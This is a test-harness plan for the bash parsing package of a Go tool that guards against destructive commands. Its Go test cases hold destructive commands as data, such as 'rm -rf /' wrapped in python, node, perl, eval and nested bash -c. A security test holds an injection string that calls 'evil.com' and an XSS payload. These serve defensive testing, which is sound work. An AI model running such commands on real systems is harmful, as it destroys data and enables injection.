# 01: Tree-sitter Integration — Test Harness

**Plan**: [01-treesitter-integration.md](./01-treesitter-integration.md)

---

## 1. Overview

This test harness covers the `internal/parse` package — the parsing,
extraction, normalization, dataflow analysis, and inline script detection
components. These are the foundation that all downstream matching relies on,
so correctness here is critical.

The harness is organized by test tier: property-based tests, deterministic
example tests, fault injection, comparison oracles, benchmarks, stress tests,
and manual QA.

---

## 2. Property-Based Tests (Invariants)

These tests use randomized input generation to verify invariants that must
hold for ALL inputs, not just our example cases.

### P1: Parse Never Panics

**Invariant**: For any `[]byte` input of any length, `BashParser.Parse()`
returns without panic. It may return nil tree + warnings, but never panics.

```go
func TestParseNeverPanics(t *testing.T) {
    parser := NewBashParser()
    f := func(input []byte) bool {
        // Must not panic
        defer func() {
            if r := recover(); r != nil {
                t.Errorf("Parse panicked on input %q: %v", input, r)
            }
        }()
        parser.Parse(context.Background(), string(input))
        return true
    }
    if err := quick.Check(f, &quick.Config{MaxCount: 10000}); err != nil {
        t.Fatal(err)
    }
}
```

**Generator strategy**: Random bytes, random ASCII, random bash-like tokens
(command names, flags, operators, quotes, dollar signs), random unicode,
empty inputs, single characters, very long inputs.

### P2: Extract Output Consistency

**Invariant**: For any AST that Parse returns, every `ExtractedCommand` in the
result satisfies:
- `cmd.RawText` is a substring of the original input
- `cmd.StartByte < cmd.EndByte`
- `cmd.StartByte` and `cmd.EndByte` are within input bounds
- `cmd.Name != ""` (every extracted command has a name — the extractor
  filters out commands with no identifiable name)
- If `cmd.Flags` is non-nil, every key starts with `-`

```go
func TestExtractOutputConsistency(t *testing.T) {
    parser := NewBashParser()
    f := func(input string) bool {
        tree, _ := parser.Parse(context.Background(), input)
        if tree == nil {
            return true // Nothing to check
        }
        result := NewCommandExtractor(parser).Extract(tree)
        for _, cmd := range result.Commands {
            if cmd.Name == "" {
                return false
            }
            if cmd.StartByte >= cmd.EndByte {
                return false
            }
            if int(cmd.EndByte) > len(input) {
                return false
            }
            if cmd.RawText != input[cmd.StartByte:cmd.EndByte] {
                return false
            }
            for k := range cmd.Flags {
                if !strings.HasPrefix(k, "-") {
                    return false
                }
            }
        }
        return true
    }
    quick.Check(f, &quick.Config{MaxCount: 5000})
}
```

### P3: Normalize is Idempotent

**Invariant**: `Normalize(Normalize(x)) == Normalize(x)` for all strings.

```go
func TestNormalizeIdempotent(t *testing.T) {
    f := func(s string) bool {
        return Normalize(Normalize(s)) == Normalize(s)
    }
    quick.Check(f, &quick.Config{MaxCount: 10000})
}
```

### P4: Dataflow Expansion is Bounded

**Invariant**: `len(da.ResolveString(s)) <= 16` for any input string and any
analyzer state.

```go
func TestDataflowExpansionBounded(t *testing.T) {
    // Create analyzer with many || branches
    da := NewDataflowAnalyzer()
    // Add 20 variables each with 5 possible values
    for i := 0; i < 20; i++ {
        name := fmt.Sprintf("VAR%d", i)
        for j := 0; j < 5; j++ {
            if j == 0 {
                da.Define(name, fmt.Sprintf("val%d", j), false)
            } else {
                other := NewDataflowAnalyzer()
                other.Define(name, fmt.Sprintf("val%d", j), false)
                da.MergeBranch(other)
            }
        }
    }

    // ResolveString with multiple variable references
    result := da.ResolveString("$VAR0 $VAR1 $VAR2 $VAR3 $VAR4")
    if len(result) > 16 {
        t.Errorf("expansion produced %d results, expected <= 16", len(result))
    }
}
```

### P5: Parse + Extract Never Panics Together

**Invariant**: The full `Parse → Extract` pipeline never panics for any input.

```go
func TestFullPipelineNeverPanics(t *testing.T) {
    parser := NewBashParser()
    extractor := NewCommandExtractor(parser)
    f := func(input []byte) bool {
        defer func() {
            if r := recover(); r != nil {
                t.Errorf("pipeline panicked on input %q: %v", input, r)
            }
        }()
        tree, _ := parser.Parse(context.Background(), string(input))
        if tree != nil {
            extractor.Extract(tree)
        }
        return true
    }
    quick.Check(f, &quick.Config{MaxCount: 10000})
}
```

### P6: Inline Detection Depth Bounded

**Invariant**: Inline script detection never recurses deeper than
`MaxInlineDepth` (3). For any input, the number of recursive parse calls
is bounded.

Test by instrumenting the `InlineDetector` with a depth counter and verifying
it never exceeds the limit, regardless of input nesting depth.

### P7: ParseResult Boundary Contract Locked

**Invariant**: `ParseResult` always carries cross-plan boundary fields in the
form expected by plan 02:
- `ExportedVars map[string][]string` populated from dataflow/export analysis
- warning payloads expressed as `guard.Warning` (`Code`, `Message`)

```go
func TestPropertyParseResultBoundaryContract(t *testing.T) {
    result := parser.ParseAndExtract(ctx,
        "export RAILS_ENV=production && broken_syntax && rails db:reset", 0)

    // Contract field exists and carries export values.
    vals, ok := result.ExportedVars["RAILS_ENV"]
    require.True(t, ok, "expected exported variable in ParseResult.ExportedVars")
    require.Contains(t, vals, "production")

    // Warning payload contract: shared warning type/codes.
    for _, w := range result.Warnings {
        require.NotEmpty(t, w.Message)
        switch w.Code {
        case guard.WarnPartialParse,
            guard.WarnInlineDepthExceeded,
            guard.WarnInputTruncated,
            guard.WarnExpansionCapped,
            guard.WarnExtractorPanic,
            guard.WarnCommandSubstitution:
            // valid shared warning code
        default:
            t.Fatalf("unexpected warning code in ParseResult boundary: %v", w.Code)
        }
    }
}
```

---

## 3. Deterministic Example Tests

### E1: Command Extraction Coverage Matrix

A comprehensive table-driven test covering every combination of:

| Dimension | Values |
|-----------|--------|
| Command form | bare, with-args, with-flags, with-long-flags, with-inline-env |
| Compound form | standalone, pipeline, && chain, \|\| chain, ; chain, subshell, command substitution, backgrounded |
| Quoting | unquoted, single-quoted, double-quoted, mixed |
| Path prefix | none, absolute (/usr/bin/), relative (./), home (~/) |
| Flag style | short (-f), combined short (-rf), long (--force), long with value (--force=x) |
| Negation | normal, negated (!) |

Expected output is specified for every combination. This is the highest-value
test set — if extraction works for all combinations, downstream matching will
work correctly.

**Minimum test count**: 80+ test cases covering the matrix.

### E2: Dataflow Resolution Examples

Specific test cases from the architecture §8 examples:

```go
var dataflowTests = []struct {
    name  string
    input string
    // Expected: variable → resolved value(s) at each command
    expect map[string][]string
}{
    {
        name:   "simple variable carry",
        input:  "DIR=/; rm -rf $DIR",
        expect: map[string][]string{"DIR": {"/"}},
    },
    {
        name:   "export propagation",
        input:  "export RAILS_ENV=production && rails db:reset",
        expect: map[string][]string{"RAILS_ENV": {"production"}},
    },
    {
        name:   "or branch may-alias",
        input:  "DIR=/tmp || DIR=/; rm -rf $DIR",
        expect: map[string][]string{"DIR": {"/tmp", "/"}},
    },
    {
        name:   "sequential override",
        input:  "DIR=/tmp; DIR=/; rm -rf $DIR",
        expect: map[string][]string{"DIR": {"/"}},
    },
    {
        name:   "and chain may-alias",
        input:  "DIR=/ && DIR=/tmp && rm -rf $DIR",
        expect: map[string][]string{"DIR": {"/", "/tmp"}}, // Both values tracked
    },
    {
        name:   "and chain false negative prevention",
        input:  "DIR=/ && something && DIR=/tmp && rm -rf $DIR",
        expect: map[string][]string{"DIR": {"/", "/tmp"}}, // May-alias preserves dangerous value
    },
    {
        name:   "mixed and-or chain",
        input:  "A=foo && B=bar || C=baz; echo $A $B $C",
        expect: map[string][]string{
            "A": {"foo"}, "B": {"bar"}, "C": {"baz"},
        }, // All branches may-execute
    },
    {
        name:   "url-shaped env var",
        input:  "DB_HOST=prod-db.internal; psql -h $DB_HOST -c 'DROP TABLE users'",
        expect: map[string][]string{"DB_HOST": {"prod-db.internal"}},
    },
    {
        name:   "subshell flattening",
        input:  "(export FOO=bar); echo $FOO",
        expect: map[string][]string{"FOO": {"bar"}}, // Over-approximation (real bash: FOO unset)
    },
    {
        name:   "pipeline flattening",
        input:  "DANGER=true | bash -c 'rm -rf $DANGER'",
        expect: map[string][]string{"DANGER": {"true"}}, // Over-approximation (real bash: separate subshells)
    },
    {
        name:   "command substitution indeterminate",
        input:  "FILE=$(mktemp); rm -rf $FILE",
        expect: map[string][]string{}, // FILE is indeterminate, $FILE left unsubstituted
    },
    {
        name:   "unresolved variable",
        input:  "rm -rf $UNKNOWN",
        expect: map[string][]string{}, // UNKNOWN not tracked
    },
    {
        name:   "common pipeline no false positives",
        input:  "cat /var/log/syslog | grep error | sort | uniq -c",
        expect: map[string][]string{}, // No variable assignments, no dataflow issues
    },
}
```

### E3: Inline Script Detection Examples

```go
var inlineTests = []struct {
    name           string
    input          string
    expectCommands []string // Expected extracted command names (including nested)
    expectWarnings []guard.WarningCode
}{
    {
        name:           "python os.system",
        input:          `python -c "import os; os.system('rm -rf /')"`,
        expectCommands: []string{"python", "rm"},
    },
    {
        name:           "bash -c simple",
        input:          `bash -c "rm -rf /tmp/foo"`,
        expectCommands: []string{"bash", "rm"},
    },
    {
        name:           "ruby system",
        input:          `ruby -e "system('git push --force')"`,
        expectCommands: []string{"ruby", "git"},
    },
    {
        name:           "node execSync",
        input:          `node -e "require('child_process').execSync('rm -rf /')"`,
        expectCommands: []string{"node", "rm"},
    },
    {
        name:           "heredoc to bash",
        input:          "bash <<'EOF'\nrm -rf /\nEOF",
        expectCommands: []string{"bash", "rm"},
    },
    {
        name:           "nested bash -c at max depth",
        input:          `bash -c "bash -c \"bash -c \\\"rm -rf /\\\"\""`,
        expectCommands: []string{"bash", "bash", "bash", "rm"},
    },
    {
        name:           "nested beyond max depth",
        input:          `bash -c "bash -c \"bash -c \\\"bash -c \\\\\\\"rm -rf /\\\\\\\"\\\"\""`,
        expectWarnings: []WarningCode{WarnInlineDepthExceeded},
    },
    {
        name:           "eval simple",
        input:          `eval "rm -rf /"`,
        expectCommands: []string{"eval", "rm"},
    },
    {
        name:           "eval unquoted args",
        input:          `eval rm -rf /`,
        expectCommands: []string{"eval", "rm"},
    },
    {
        name:           "no inline script",
        input:          "python script.py",
        expectCommands: []string{"python"},
    },
    {
        name:           "perl -e",
        input:          `perl -e 'system("rm -rf /")'`,
        expectCommands: []string{"perl", "rm"},
    },
    // Negative cases — commands with -c/-e flags that are NOT inline triggers
    {
        name:           "gcc -c is not inline",
        input:          "gcc -c file.c",
        expectCommands: []string{"gcc"}, // No nested extraction
    },
    {
        name:           "tar -czf is not inline",
        input:          "tar -czf archive.tar.gz /data",
        expectCommands: []string{"tar"}, // No nested extraction
    },
    {
        name:           "python -c with no arg",
        input:          "python -c",
        expectCommands: []string{"python"}, // No script body to extract
    },
    {
        name:           "ruby -e empty string",
        input:          `ruby -e ''`,
        expectCommands: []string{"ruby"}, // Empty script body, nothing to extract
    },
    {
        name:           "node --eval long flag",
        input:          `node --eval "require('child_process').execSync('rm -rf /')"`,
        expectCommands: []string{"node", "rm"},
    },
    {
        name:           "bash -c with variable ref",
        input:          `bash -c "$CMD"`,
        expectCommands: []string{"bash"}, // $CMD unresolved, opaque
    },
}
```

### E4: Error Recovery Examples

Tests for partial parse behavior with malformed input:

```go
var errorRecoveryTests = []struct {
    name       string
    input      string
    expectSome bool  // Should extract at least some commands?
    hasError   bool  // Should ParseResult.HasError be true?
}{
    {"unmatched quote", `git push "`, true, true},
    {"triple &&", "git push &&& rm -rf /", true, true},
    {"dangling pipe", "echo hello |", true, true},
    {"unmatched paren", "(git push", true, true},
    {"valid input", "git push", true, false},
    {"empty", "", false, false},
}
```

---

## 4. Fault Injection / Chaos Tests

### F1: Context Cancellation

Verify that parsing respects context cancellation:

```go
func TestParseCancelledContext(t *testing.T) {
    parser := NewBashParser()
    ctx, cancel := context.WithCancel(context.Background())
    cancel() // Cancel immediately
    tree, warnings := parser.Parse(ctx, "git push --force")
    // Should either return nil tree or a valid tree (depending on timing)
    // Must not panic or hang
}
```

### F2: Extremely Long Input

```go
func TestParseLongInput(t *testing.T) {
    parser := NewBashParser()

    // Just under the limit
    input := strings.Repeat("echo hello; ", MaxInputSize/len("echo hello; ")-1)
    tree, warnings := parser.Parse(context.Background(), input)
    assert.NotNil(t, tree)
    assert.Empty(t, warnings) // No truncation warning

    // Over the limit
    input = strings.Repeat("a", MaxInputSize+1)
    tree, warnings = parser.Parse(context.Background(), input)
    assert.Nil(t, tree)
    assert.Contains(t, warnings, Warning{Code: WarnInputTruncated})
}
```

### F3: Adversarial Quoting

Commands with deeply nested quoting that stress the parser:

```go
func TestAdversarialQuoting(t *testing.T) {
    inputs := []string{
        `echo "hello 'world "nested" quotes' end"`,
        `echo $'escape\nsequence'`,
        `echo "$(echo "$(echo "deep")")"`,
        strings.Repeat(`"`, 1000),                    // 1000 quotes
        strings.Repeat(`'`, 999),                      // Odd number of quotes
        `echo "unterminated`,
        `echo 'single "mixed' "quotes"`,
    }
    parser := NewBashParser()
    for _, input := range inputs {
        t.Run(input[:min(30, len(input))], func(t *testing.T) {
            // Must not panic
            parser.Parse(context.Background(), input)
        })
    }
}
```

### F4: Unicode Edge Cases

```go
func TestUnicodeInput(t *testing.T) {
    inputs := []string{
        "echo '日本語'",
        "echo '\xfe\xff'",            // Invalid UTF-8
        "echo '\x00hidden\x00'",      // Null bytes
        "rm -rf /tmp/名前",
        "echo $'\\u0000'",            // Bash unicode escape
        string([]byte{0xff, 0xfe}),   // BOM
    }
    parser := NewBashParser()
    for _, input := range inputs {
        // Must not panic
        parser.Parse(context.Background(), input)
    }
}
```

---

## 5. Comparison Oracle Tests

### O1: Tree-sitter CLI Comparison

For a corpus of bash commands, compare our extraction output against the
tree-sitter CLI's S-expression output to verify we're reading the AST
correctly.

**Method**: For each test command:
1. Parse with our `BashParser` and record the S-expression (`root.String()`)
2. Parse the same command with the tree-sitter CLI (if available) or with
   a known-good reference implementation
3. Verify the S-expressions match

This catches bugs where we misinterpret node types or field names.

### O2: Bash Execution Comparison (Dataflow)

For dataflow test cases, verify our variable resolution matches actual bash:

```bash
# For each dataflow test case, run in actual bash:
bash -c 'DIR=/tmp; echo "$DIR"'
# Compare output to our DataflowAnalyzer.Resolve("DIR") result
```

This validates that our over-approximation doesn't miss cases where bash
actually does propagate variables.

**Test corpus**: All examples from §3 E2 dataflow tests, plus:
- `A=1 B=$A echo $B` (does inline env see other inline env?)
- `export A=1; bash -c 'echo $A'` (export to subshell)
- `(A=1); echo $A` (subshell does NOT propagate — our over-approximation differs)
- `A=1 | echo $A` (pipeline: A not visible in echo — our over-approximation differs)
- `DIR=/ && DIR=/tmp; echo $DIR` (&&: real bash → /tmp; our may-alias → both values)
- `cat /var/log/syslog | grep error | sort` (common pipeline — no false positives expected)

For cases where our over-approximation produces false positives (like
subshell/pipeline propagation and `&&` may-alias), document the intentional
difference and verify the false positives don't trigger on common patterns.

### O3: Upstream Rust Version Comparison

Run the same command corpus through the upstream Rust destructive-command-guard
(if available) and compare which commands trigger matches. This is for Batch 5
but we prepare the test corpus now.

**Corpus preparation**: Generate commands from:
- Pack pattern examples (both destructive and safe variants from shaping doc)
- Flag ordering variations
- Path-prefixed variants
- Quoted argument variants
- Pipeline and compound command variants

**Expected differences**: Document expected differences due to AST-first vs
regex-first approach. Our version should have:
- Fewer false positives (string arguments not confused with commands)
- Same or more true positives (structural understanding catches edge cases)

---

## 6. Benchmarks and Performance Tests

### B1: Parse Latency

Benchmark `BashParser.Parse()` for representative command lengths:

| Category | Example | Target |
|----------|---------|--------|
| Short (< 50 bytes) | `git push --force` | Baseline (record) |
| Medium (50-200 bytes) | `RAILS_ENV=production rails db:reset` | Baseline (record) |
| Long (200-1000 bytes) | Complex pipeline with 5 stages | Baseline (record) |
| Very long (1-10KB) | Script-like multi-line command | Baseline (record) |
| Max (128KB) | Boundary input | Baseline (record) |

**Note**: No specific latency targets for v1. Record baselines during initial
implementation. Targets will be established after baselines exist.

### B2: Extract Latency

Benchmark `CommandExtractor.Extract()` separately from parsing:

Same categories as B1, measuring only extraction time (parser output is
pre-computed).

### B3: Dataflow Resolution

Benchmark `DataflowAnalyzer.ResolveString()`:

| Case | Description | Target |
|------|-------------|--------|
| No variables | Plain string | Baseline (record) |
| 1 variable, 1 value | `$DIR` → `/tmp` | Baseline (record) |
| 3 variables, 1 value each | `$A $B $C` | Baseline (record) |
| 1 variable, 5 values (or-branch) | `$DIR` → 5 possibilities | Baseline (record) |
| Expansion limit hit | 3 vars × 5 values = capped at 16 | Baseline (record) |

### B4: Full Pipeline

Benchmark `Parse + Extract` end-to-end (the complete internal/parse path):

Same categories as B1. This is the number that matters — it's what the
eval pipeline (Batch 2) will call.

### B5: Parser Pool Effectiveness

Benchmark with and without `sync.Pool` to quantify the benefit:

```go
func BenchmarkParseWithPool(b *testing.B) { ... }
func BenchmarkParseWithoutPool(b *testing.B) {
    // Create new parser each time
    for i := 0; i < b.N; i++ {
        p := newBashParser()
        p.ParseString(ctx, source)
    }
}
```

### B6: Inline Detection Overhead

Benchmark the cost of inline detection for commands that DO contain inline
scripts vs commands that don't. The overhead for non-inline commands should
be negligible (just a name check).

---

## 7. Stress / Soak Tests

### S1: Concurrent Parsing

100 goroutines each parsing 10,000 different commands simultaneously.
Verify:
- No panics
- No data races (run with `-race`)
- All results are valid (satisfy property invariants P1-P5)
- Memory usage stays bounded (no leaks from parser pool)

```go
func TestConcurrentParsing(t *testing.T) {
    parser := NewBashParser()
    extractor := NewCommandExtractor(parser)

    var wg sync.WaitGroup
    for g := 0; g < 100; g++ {
        wg.Add(1)
        go func(goroutine int) {
            defer wg.Done()
            for i := 0; i < 10000; i++ {
                input := generateRandomCommand(goroutine, i)
                tree, _ := parser.Parse(context.Background(), input)
                if tree != nil {
                    extractor.Extract(tree)
                }
            }
        }(g)
    }
    wg.Wait()
}
```

### S2: Memory Soak

Parse 1 million commands sequentially and monitor memory:
- Heap should stabilize (no monotonic growth)
- Parser pool reuse should be evident in allocation stats

```go
func TestMemorySoak(t *testing.T) {
    if testing.Short() {
        t.Skip("skipping soak test in short mode")
    }
    parser := NewBashParser()

    var m runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&m)
    startHeapInuse := m.HeapInuse

    for i := 0; i < 1_000_000; i++ {
        input := generateCommand(i)
        tree, _ := parser.Parse(context.Background(), input)
        if tree != nil {
            NewCommandExtractor(parser).Extract(tree)
        }
        if i%100_000 == 0 {
            runtime.GC()
            runtime.ReadMemStats(&m)
            t.Logf("After %d iterations: HeapInuse=%dMB",
                i, m.HeapInuse/1024/1024)
        }
    }

    runtime.GC()
    runtime.ReadMemStats(&m)
    // HeapInuse should stabilize. Allow 50MB growth for parser pool + GC overhead.
    // Rationale: sync.Pool holds ~GOMAXPROCS parsers, each ~1-2MB. With GC
    // overhead, 50MB is generous. Monotonic growth beyond this indicates a leak.
    growth := m.HeapInuse - startHeapInuse
    if growth > 50*1024*1024 {
        t.Errorf("HeapInuse grew by %dMB (from %dMB to %dMB), possible leak",
            growth/1024/1024, startHeapInuse/1024/1024, m.HeapInuse/1024/1024)
    }
}
```

---

## 8. Fuzz Testing

### FZ1: Parse Fuzzing

Go native fuzzing target:

```go
func FuzzParse(f *testing.F) {
    // Seed corpus
    f.Add("git push --force")
    f.Add("rm -rf /")
    f.Add("echo 'hello world'")
    f.Add("RAILS_ENV=production rails db:reset")
    f.Add("python -c \"import os\"")
    f.Add("")
    f.Add("   ")
    f.Add(strings.Repeat("a", 1000))

    parser := NewBashParser()

    f.Fuzz(func(t *testing.T, input string) {
        // Must not panic
        tree, warnings := parser.Parse(context.Background(), input)

        // Validate invariants
        for _, w := range warnings {
            if w.Code < 0 || w.Code > WarnInputTruncated {
                t.Errorf("invalid warning code: %d", w.Code)
            }
        }

        if tree != nil {
            result := NewCommandExtractor(parser).Extract(tree)

            // Every command must have a non-empty name
            for _, cmd := range result.Commands {
                if cmd.Name == "" {
                    t.Errorf("extracted command with empty name from input %q", input)
                }
            }

            // Byte offsets must be valid
            for _, cmd := range result.Commands {
                if int(cmd.EndByte) > len(input) {
                    t.Errorf("EndByte %d > len(input) %d", cmd.EndByte, len(input))
                }
            }
        }
    })
}
```

### FZ2: Dataflow Fuzzing

```go
func FuzzDataflow(f *testing.F) {
    f.Add("DIR=/tmp; rm -rf $DIR")
    f.Add("A=1 || A=2; echo $A")
    f.Add("export FOO=bar && echo $FOO")

    parser := NewBashParser()

    f.Fuzz(func(t *testing.T, input string) {
        tree, _ := parser.Parse(context.Background(), input)
        if tree == nil {
            return
        }
        result := NewCommandExtractor(parser).Extract(tree)

        // No command should have more than 16 expansion variants
        // (validated by the bounded expansion invariant)
        _ = result
    })
}
```

---

## 9. Security Tests

While DCG is not a security boundary (it's a mistake preventer), we still
verify it doesn't introduce security issues in its own processing.

### SEC1: No Command Injection in Diagnostics

Verify that `Warning.Message` and `Match.Reason` strings don't include
unsanitized input that could cause issues if logged or displayed:

```go
func TestWarningMessageSafety(t *testing.T) {
    parser := NewBashParser()
    // Input with potential injection payloads
    inputs := []string{
        `rm -rf / ; echo "$(curl evil.com)"`,
        "echo '\x1b[31mred\x1b[0m'", // ANSI escape codes
        `echo "<script>alert('xss')</script>"`,
    }
    for _, input := range inputs {
        _, warnings := parser.Parse(context.Background(), input)
        for _, w := range warnings {
            // Warning messages should not include raw unsanitized input
            // (they should reference positions, not repeat input content)
            if strings.Contains(w.Message, "<script>") {
                t.Errorf("warning message contains unsanitized input: %s", w.Message)
            }
        }
    }
}
```

### SEC2: Memory Safety with Malicious Input

Verify that crafted inputs designed to cause out-of-bounds access don't panic:

```go
func TestMemorySafety(t *testing.T) {
    parser := NewBashParser()
    inputs := []string{
        string(make([]byte, MaxInputSize)),   // Max size zeros
        string(make([]byte, MaxInputSize+1)), // Over max
        "\x00\x00\x00\x00",                  // Null bytes
    }
    for _, input := range inputs {
        // Must not panic or segfault
        parser.Parse(context.Background(), input)
    }
}
```

---

## 10. Manual QA Plan

### MQ1: Visual AST Inspection

For 10 representative real-world commands, manually inspect the S-expression
output of tree-sitter parsing and verify it matches expectations. This catches
subtle grammar misunderstandings.

Commands to inspect:
1. `git push --force origin main`
2. `RAILS_ENV=production rails db:reset`
3. `docker compose down -v --rmi all`
4. `kubectl delete namespace production`
5. `python -c "import os; os.system('rm -rf /')"`
6. `bash <<'EOF'\nterraform destroy -auto-approve\nEOF`
7. `export AWS_PROFILE=production && aws ec2 terminate-instances --instance-ids i-123`
8. `DIR=/important; cd $DIR && rm -rf ./*`
9. `cat script.sh | bash`
10. `echo "safe text with git push --force inside quotes"`

For each: print the S-expression, print the extracted commands, and verify
they match the expected structural interpretation.

### MQ2: Edge Case Review

Manually review extraction results for edge cases that are hard to specify
programmatically:

1. **Aliased commands**: `alias g=git; g push --force` — verify we extract
   `g` (not `git`) and document the limitation
2. **Function definitions**: `foo() { rm -rf /; }; foo` — verify we extract
   `rm -rf /` from the function body but not from the `foo` call
3. **Arithmetic context**: `(( x = 1 ))` — verify this doesn't extract as a command
4. **Test expressions**: `[[ -f /tmp/foo ]]` — verify not extracted as command
5. **Here-string**: `cat <<< "some text"` — verify handled correctly
6. **Process substitution**: `diff <(ls /a) <(ls /b)` — verify inner commands extracted
7. **Brace expansion**: `echo {a,b,c}` — verify treated as argument, not special

### MQ3: Inline Detection Coverage Check

For each supported language (Python, Ruby, JS, Perl, Lua), run 5 example
commands through the inline detector and verify:
- Script body is correctly extracted
- Shell invocation calls are found
- Nested commands are re-parsed as bash
- Non-shell function calls are ignored

---

## 11. CI Tier Mapping

| Tier | Tests | Run When | Timeout |
|------|-------|----------|---------|
| **Tier 0: Pre-commit** | Unit tests, property tests P1-P5 | Every commit | 30s |
| **Tier 1: PR** | All Tier 0 + deterministic examples E1-E4 + error recovery + benchmarks B1-B4 | Every PR | 2min |
| **Tier 2: Merge** | All Tier 1 + fuzz tests (30s each) + concurrent stress S1 | Merge to main | 5min |
| **Tier 3: Nightly** | All Tier 2 + memory soak S2 + comparison oracles O1-O2 + extended fuzz (5min each) | Nightly | 30min |

---

## 12. Exit Criteria

Implementation is complete when ALL of the following pass:

### Must-Pass

- [ ] All unit tests pass (bash_test.go, extract_test.go, normalize_test.go,
      dataflow_test.go, inline_test.go, grammars_test.go)
- [ ] All property-based tests pass (P1-P6)
- [ ] All deterministic example tests pass (E1-E4)
- [ ] All fault injection tests pass (F1-F4)
- [ ] All fuzz tests run for 30s with no failures (FZ1-FZ2)
- [ ] Concurrent stress test S1 passes with `-race` flag
- [ ] Benchmarks B1-B4 produce results (no specific targets required for v1,
      but results must be recorded as baseline)
- [ ] Parser pool benchmark B5 shows measurable improvement over no-pool
- [ ] `go vet ./internal/parse/...` produces no warnings
- [ ] Test coverage for `internal/parse` is >= 85% line coverage

### Should-Pass (not blocking, but tracked)

- [ ] Memory soak S2 shows no monotonic heap growth
- [ ] Comparison oracle O1 confirms S-expression match for all corpus commands
- [ ] Comparison oracle O2 confirms dataflow resolution matches bash for
      non-over-approximation cases
- [ ] Manual QA MQ1-MQ3 reviewed and results documented
- [ ] Inline detection B6 shows < 1μs overhead for non-inline commands

### Metrics to Record

- Parse latency p50/p95/p99 for each command category (B1)
- Extract latency p50/p95/p99 (B2)
- Full pipeline latency p50/p95/p99 (B4)
- Parser pool hit rate (B5)
- Test coverage percentage
- Fuzz corpus size after 30s run
- Concurrent stress test: total commands parsed, any failures

---

## 13. Test Data Management

### Corpus Files

Test corpora are stored as Go test data:

```
internal/parse/testdata/
├── commands.txt          # One command per line, for bulk testing
├── dataflow_cases.txt    # Dataflow test cases with expected resolutions
├── inline_scripts.txt    # Inline script detection cases
└── error_recovery.txt    # Malformed inputs for error recovery testing
```

### Golden Files

Extraction golden files (for regression testing):

```
internal/parse/testdata/golden/
├── simple_commands.golden    # Input → ExtractedCommand JSON
├── compound_commands.golden
├── dataflow.golden
├── inline.golden
└── error_recovery.golden
```

Format: Each entry is `---INPUT---\n<command>\n---OUTPUT---\n<JSON>\n`.
Tests compare actual extraction output against golden file. Any change
requires explicit update (`go test -update-golden`).

---

## Round 1 Review Disposition

Incorporated feedback from: `01-treesitter-integration-review-security-correctness.md`,
`01-treesitter-integration-review-systems-engineer.md`.

| Finding | Reviewer | Severity | Summary | Disposition | Notes |
|---------|----------|----------|---------|-------------|-------|
| SC-P2.3 | security-correctness | P2 | Subshell/pipeline flattening lacks test coverage | Incorporated | Added pipeline scoping tests to E2 and O2 |
| SC-P2.6 | security-correctness | P2 | Property P2 may be violated by ERROR recovery | Incorporated | P2 invariant note updated; extractor filters empty names |
| SC-P3.3 | security-correctness | P3 | Insufficient negative tests for inline detection | Incorporated | Added 6 negative/edge-case tests to E3 |
| SE-01-P3.3 | systems-engineer | P3 | Test harness P2 invariant too strict | Incorporated | Merged with SC-P2.6 |
| SE-01-P3.4 | systems-engineer | P3 | Benchmark targets aspirational without baseline | Incorporated | B1 and B3 targets changed to "Baseline (record)" |
| SE-01-P3.5 | systems-engineer | P3 | Soak test memory assertion brittle | Incorporated | S2 uses HeapInuse consistently, threshold reduced to 50MB with rationale |

## Round 2 Review Disposition

| # | Reviewer | Severity | Summary | Disposition | Notes |
|---|----------|----------|---------|-------------|-------|
| 1 | dcg-coder-1 | P2 | Harness does not lock the ParseResult boundary contract | Incorporated | Added P7 boundary-contract property test for `ExportedVars` and shared warning payload semantics, including mixed warning scenarios. |

## Round 3 Review Disposition

No new findings.

---

## Completion Signoff

- **Status**: Partial
- **Date**: 2026-03-03
- **Branch**: main
- **Verified by**: dcg-coder-1
- **Completed items**:
  - Property, deterministic, golden, fault-injection, benchmark, security, and stress-style test categories are implemented in `internal/parse/*_test.go`.
  - Golden regression harness is implemented and passing (`internal/parse/golden_test.go` + `internal/parse/testdata/golden/*.golden`).
  - Boundary-contract coverage is implemented (`TestPropertyParseResultBoundaryContract`) and passing.
  - Verification commands passed: `make test`; targeted race run for parse package.
- **Outstanding gaps**:
  - The documented corpus text files (`internal/parse/testdata/commands.txt`, `dataflow_cases.txt`, `inline_scripts.txt`, `error_recovery.txt`) are not present; test data is currently embedded/generated in tests. Severity: P3 (documentation/traceability gap).
  - `inline.golden` is listed in this harness doc but does not exist under `internal/parse/testdata/golden/`. Severity: P3 (documentation-vs-assets mismatch).

---
## Completion Signoff
- **Status**: Partial
- **Date**: 2026-03-04
- **Branch**: main
- **Commit**: e9ab0f5
- **Verified by**: dcg-coder-1
- **Test verification**: `go test ./internal/parse -count=1` — PASS
- **Outstanding gaps**: Planned identifiers above are not implemented under the exact documented names; this doc still needs reconciliation from example-name form to actual test inventory.
- **Deviations from plan**: Several planned test/benchmark identifiers are not present verbatim in code (`TestParseNeverPanics`, `TestParseLongInput`, `TestMemorySoak`, `TestConcurrentParsing`, `BenchmarkParseWithPool`, `BenchmarkParseWithoutPool`). Implemented equivalents exist with renamed scopes/suffixes (for example `TestConcurrentParsingStress`, `TestMemorySoakS2`, `TestPropertyExtractOutputConsistency`).
- **Additions beyond plan**: Additional parse fuzz coverage exists (`FuzzParseAndExtract`) and parser security/fault suites are broader than the original harness examples.
